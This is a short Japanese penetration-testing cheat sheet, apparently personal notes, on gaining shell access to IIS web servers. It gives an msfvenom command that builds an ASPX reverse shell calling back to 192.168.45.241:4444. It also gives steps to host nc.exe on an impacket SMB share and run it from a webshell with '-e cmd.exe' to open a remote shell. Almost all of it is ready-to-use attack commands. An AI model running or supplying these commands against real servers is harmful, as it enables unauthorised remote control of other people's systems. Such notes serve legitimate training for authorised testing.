# IIS

[toc]

FTPで共有されているディレクトリを直接読むことができる場合がある。

ASP、ASPXが動作しやすい

ホームディレクトリ

```
C:\inetpub\wwwroot\
```

### webshell

[webshell_asp](./../webshell.md/#ASP)

### リバースシェル(aspx)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.241 LPORT=4444 -f aspx > reverse.aspx
```



#### smbserver + webshell (nc.exeやaspxのリバースシェルがうまく実行しない場合）

```cmd
# kali
cp /usr/share/doc/python3-impacket/examples/smbserver.py ./
sudo /etc/init.d/smbd stop 
mkdir share			# 共有ディレクトリを作成
cp nc.exe share/	# 実行したいexeファイルをshare配下に移動
sudo python smbserver.py share smb	#smbサーバーを起動
```

```cmd
# webshellで実行
\\192.168.45.241\share\nc.exe -e cmd.exe 192.168.45.241 4444
\\<kaliのip>\share\nc.exe -e cmd.exe <kaliのip> 4444
```

